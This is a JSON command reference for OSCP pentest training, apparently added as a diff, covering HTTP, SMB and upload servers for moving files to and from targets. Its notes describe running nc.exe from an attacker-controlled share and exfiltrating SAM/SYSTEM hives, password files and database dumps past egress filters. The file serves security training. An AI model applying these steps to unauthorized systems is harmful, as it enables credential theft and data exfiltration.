@@ -1,0 +1,188 @@
+{
+  "category": "file-transfer",
+  "subcategory": "server-setup",
+  "description": "File transfer server setup commands for OSCP",
+  "commands": [
+    {
+      "id": "ft-python-http-server",
+      "name": "Setup: Python HTTP Server",
+      "category": "file-transfer",
+      "subcategory": "server-setup",
+      "command": "python3 -m http.server <PORT>",
+      "description": "Start HTTP server on attack machine to serve files for download",
+      "tags": [
+        "FILE_TRANSFER",
+        "HTTP",
+        "PYTHON",
+        "SERVER",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<PORT>",
+          "description": "Port to serve on (default 8000 if omitted)",
+          "example": "8000",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "-m": "Run library module as a script - executes the http.server module directly without needing a separate script file",
+        "http.server": "Built-in Python module that provides a simple HTTP server - no installation required, available on Kali and most Linux systems",
+        "<PORT>": "Listening port - common choices are 80 (requires sudo), 443 (requires sudo), 8000 (default), 8080, or any high port (1024-65535)"
+      },
+      "success_indicators": [
+        "Serving HTTP on 0.0.0.0 port <PORT>",
+        "GET request logged when target downloads",
+        "200 status code in logs"
+      ],
+      "failure_indicators": [
+        "Address already in use - another service on this port",
+        "Permission denied - ports <1024 require sudo",
+        "No route to host - firewall blocking connection"
+      ],
+      "troubleshooting": {
+        "Port already in use": "Change port or find process: sudo lsof -i :<PORT> then kill it",
+        "Permission denied on port 80/443": "Use sudo: sudo python3 -m http.server 80",
+        "Target cannot connect": "Check firewall rules, verify IP with: ip a, test with: curl http://127.0.0.1:<PORT>",
+        "Wrong Python version": "Ensure Python 3: python3 -m http.server (Python 2 uses SimpleHTTPServer)"
+      },
+      "prerequisites": [],
+      "alternatives": [
+        "ft-php-http-server",
+        "ft-ruby-http-server"
+      ],
+      "next_steps": [
+        "ft-wget-download",
+        "ft-certutil-download",
+        "ft-powershell-iwr"
+      ],
+      "notes": "OSCP METHODOLOGY: This is your go-to file server for 95% of transfers. Run from directory containing your tools (cd ~/tools). Serves ALL files in current directory recursively - be careful not to expose sensitive data.\n\nMANUAL ALTERNATIVE: You could manually configure Apache/Nginx, but that's overkill for OSCP. This one-liner is faster.\n\nEXAM TIP: Start this immediately after getting VPN connection. Use a high port (8000-9000) to avoid permission issues. Keep the terminal visible to monitor download requests - confirms target connectivity.\n\nTIME ESTIMATE: 5 seconds to start server, instant downloads for tools under 50MB.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ft-smb-server",
+      "name": "Setup: Impacket SMB Server",
+      "category": "file-transfer",
+      "subcategory": "server-setup",
+      "command": "impacket-smbserver <SHARE_NAME> <DIRECTORY> -smb2support",
+      "description": "Start SMB server for Windows file transfers (faster than HTTP for large files)",
+      "tags": [
+        "FILE_TRANSFER",
+        "SMB",
+        "WINDOWS",
+        "IMPACKET",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<SHARE_NAME>",
+          "description": "Name of SMB share (will be accessed as \\\\<IP>\\<SHARE_NAME>)",
+          "example": "share",
+          "required": true
+        },
+        {
+          "name": "<DIRECTORY>",
+          "description": "Local directory to share (use . for current directory)",
+          "example": ".",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-smb2support": "Enable SMB2/SMB3 protocol support - REQUIRED for Windows 10/11 and Server 2016+ which disabled SMB1. Without this flag, modern Windows systems cannot connect",
+        "-username <USER>": "Require authentication with this username - use when target requires credentials (newer Windows updates)",
+        "-password <PASS>": "Set password for authenticated access - pair with -username when SMB signing required",
+        "<SHARE_NAME>": "Arbitrary name you choose - targets access via \\\\<KALI_IP>\\<SHARE_NAME>. Common choices: share, tools, files",
+        "<DIRECTORY>": "Absolute or relative path - serves this folder's contents. Use . to serve current directory"
+      },
+      "success_indicators": [
+        "Impacket v0.x.x - Copyright message",
+        "Config file parsed",
+        "Incoming connection from target IP",
+        "AUTHENTICATE_MESSAGE logged"
+      ],
+      "failure_indicators": [
+        "Address already in use - port 445 taken",
+        "STATUS_ACCESS_DENIED - target requires authentication",
+        "Connection timeout - firewall blocking port 445"
+      ],
+      "troubleshooting": {
+        "STATUS_ACCESS_DENIED on newer Windows": "Add authentication: -username user -password pass, then on target: net use \\\\<IP>\\share /user:user pass",
+        "Port 445 already in use": "Stop Samba: sudo systemctl stop smbd nmbd, or use different tool",
+        "Target cannot connect": "Verify port 445 open on target firewall, check with: nc -zv <TARGET> 445",
+        "Works but files not visible": "Check directory path is correct: ls -la <DIRECTORY>",
+        "SMB1 negotiation failed": "Ensure -smb2support flag present"
+      },
+      "prerequisites": [],
+      "alternatives": [
+        "ft-python-http-server"
+      ],
+      "next_steps": [
+        "ft-smb-download",
+        "ft-smb-upload"
+      ],
+      "notes": "OSCP METHODOLOGY: Use for Windows targets when HTTP is blocked or for faster transfers (10-50x faster for large files). Port 445 often allowed on internal networks even when egress HTTP is blocked.\n\nMANUAL ALTERNATIVE: Configure Samba manually in /etc/samba/smb.conf, but Impacket is much faster for quick transfers.\n\nEXAM TIP: If target is Windows 10+ and connection fails, immediately try with authentication flags. After initial setup, files can be executed directly from share without downloading: \\\\<KALI_IP>\\share\\nc.exe\n\nREALITY CHECK: Some modern Windows builds require SMB signing which this doesn't support - fall back to HTTP if authentication still fails.\n\nTIME ESTIMATE: 5 seconds to start server. File transfers 10-100MB/sec on local network (much faster than HTTP).",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ft-uploadserver",
+      "name": "Setup: Python Upload Server",
+      "category": "file-transfer",
+      "subcategory": "server-setup",
+      "command": "python3 -m uploadserver <PORT>",
+      "description": "Start HTTP server that accepts file uploads from targets (exfiltration)",
+      "tags": [
+        "FILE_TRANSFER",
+        "UPLOAD",
+        "EXFILTRATION",
+        "HTTP",
+        "PYTHON",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<PORT>",
+          "description": "Port to listen on (default 8000)",
+          "example": "80",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "-m uploadserver": "Run uploadserver module - simple HTTP server with POST upload endpoint at /upload",
+        "<PORT>": "Listening port - use 80/443 if target has egress filters, or 8000+ for convenience",
+        "--directory <DIR>": "Save uploaded files to specific directory instead of current directory",
+        "--basic-auth <USER>:<PASS>": "Require HTTP basic authentication for uploads"
+      },
+      "success_indicators": [
+        "File upload available at /upload",
+        "Serving HTTP on 0.0.0.0",
+        "POST request received",
+        "File saved: <filename>"
+      ],
+      "failure_indicators": [
+        "ModuleNotFoundError: No module named 'uploadserver'",
+        "Address already in use",
+        "Permission denied on port"
+      ],
+      "troubleshooting": {
+        "Module not found": "Install: pip3 install uploadserver OR python3 -m pip install uploadserver",
+        "Port 80 permission denied": "Run with sudo: sudo python3 -m uploadserver 80",
+        "Upload times out": "Check target egress firewall allows outbound HTTP, try port 80/443",
+        "Large file fails": "Uploadserver has no size limit, but check disk space: df -h"
+      },
+      "prerequisites": [],
+      "alternatives": [
+        "ft-smb-server",
+        "ft-nc-receive"
+      ],
+      "next_steps": [
+        "ft-powershell-upload",
+        "ft-curl-upload"
+      ],
+      "notes": "OSCP METHODOLOGY: Essential for data exfiltration - getting loot OFF the target back to Kali. Accepts uploads at /upload endpoint via POST requests. Simpler than configuring PHP upload scripts.\n\nMANUAL ALTERNATIVE: Write custom PHP/Python upload handler, but uploadserver is purpose-built and faster.\n\nINSTALLATION: pip3 install uploadserver (may need to install once on exam Kali VM).\n\nEXAM TIP: Start this when you need to exfiltrate proof.txt, database dumps, or any files from target. Files save to current directory by default - cd to organized folder first. Monitor terminal to see upload progress.\n\nCOMMON UPLOADS: proof.txt, local.txt, SAM/SYSTEM hives, password files, database dumps.\n\nTIME ESTIMATE: 5 seconds to start server, upload speed depends on file size and network (typically 1-10MB/sec).",
+      "oscp_relevance": "high"
+    }
+  ]
+}
